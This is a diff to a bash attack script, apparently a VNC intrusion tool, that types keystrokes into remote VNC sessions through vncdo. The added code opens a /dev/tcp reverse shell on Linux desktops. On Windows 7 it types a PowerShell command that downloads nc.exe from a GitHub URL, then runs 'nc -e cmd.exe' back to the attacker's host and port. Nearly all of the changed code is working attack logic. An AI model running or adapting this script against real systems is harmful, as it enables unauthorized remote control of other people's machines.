@@ -24,6 +24,9 @@ rhost=''
 rport='5900'
 lhost=$(curl -s http://whatismijnip.nl |cut -d " " -f 5)
 lport='4444'
+platform='linux'
+stage=1
+
 
 optspec=":hv-:"
 while getopts "$optspec" optchar; do
@@ -66,6 +69,22 @@ while getopts "$optspec" optchar; do
                     opt=${OPTARG%=$val}
                     lport=$val
                     ;;
+                platform)
+                    val="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
+                    ;;
+                platform=*)
+                    val=${OPTARG#*=}
+                    opt=${OPTARG%=$val}
+                    platform=$val
+                    ;;
+                stage)
+                    val="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
+                    ;;
+                stage=*)
+                    val=${OPTARG#*=}
+                    opt=${OPTARG%=$val}
+                    stage=$val
+                    ;;
                 *)
                     if [ "$OPTERR" = 1 ] && [ "${optspec:0:1}" != ":" ]; then
                         echo "Unknown option --${OPTARG}" >&2
@@ -106,6 +125,30 @@ then
     exit 1
 fi
 
-vncdo -s $rhost::$rport key super-r pause 1 type 'cmd' key enter pause 1 type 'fra' key enter pause 1 type 'exit' key enter
 
-#vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
+if [[ $platform = 'linux-gui' ]]
+then
+    echo "running a cmd to open shell (hopefully)"
+    vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
+    exit 1
+elif [[ $platform = 'win7' ]]
+then
+
+    echo "running a cmd to down netcat"
+    
+    strn="start /B powershell -command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/whitewhidow/vncshooter/raw/master/nc.exe', 'C:\\%HOMEPATH%\\nc.exe')\""
+    vncdo -s $rhost::$rport key super-r pause 1 type 'cmd' key enter pause 4 type "$strn"  key enter pause 1 type  'exit' key enter
+
+    echo "sleeping for 5 secs, downloading netcat (hopefully)"
+    sleep 5
+    echo "running a cmd to open shell (hopefully)"
+
+    vncdo -s $rhost::$rport key super-r pause 1 type 'cmd' key enter pause 4 type 'START /MIN "" nc -e cmd.exe '"$lhost"' '"$lport"'' key enter pause 1 type  'exit' key enter
+    exit 1
+fi
+
+
+
+
+
+
